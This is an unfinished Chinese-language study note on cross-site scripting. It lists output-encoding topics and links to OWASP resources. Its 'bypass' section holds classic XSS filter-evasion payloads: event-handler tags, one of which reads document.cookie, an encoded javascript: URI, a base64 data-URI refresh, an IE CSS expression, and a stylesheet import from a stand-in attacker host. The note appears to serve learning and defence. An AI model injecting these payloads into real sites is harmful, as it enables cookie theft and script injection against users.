# XSS

## 知识点

* URL Encode

  把所有非字母数字字符都将被替换成百分号（*%*）后跟两位十六进制数，空格则编码为加号

* HTML Encode

* Script编码

* CSS编码

* 富文本内容编码

* JSON编码

  * MINE类型使用application/json而不是text/plain等

* 危险字符

  ```
  TODO
  ```

  ​



## 攻击绕过方式

### 事件函数

```
<body onload=alert('test1')>
<b onmouseover=alert('Wufff!')>click me!</b>
<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
```



### 编码

```
# URI
<IMG SRC=j&#X41vascript:alert('test2')>

# JS代码
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
```



### CSS

```
# IE
<div style="color: expression(alert('XSS'))">

<style>
@import url("http://attacker.org/malicious.css");
</style>
```



## 相关资源

* [OWASP XSS 目录、概述](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))

* [OWASP XSS防御](https://www.owasp.org/index.php/XSS_)

  很全面，非常好、易懂

* [OWASP XSS过滤绕过](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

  OWASP永远是最好的

* ​



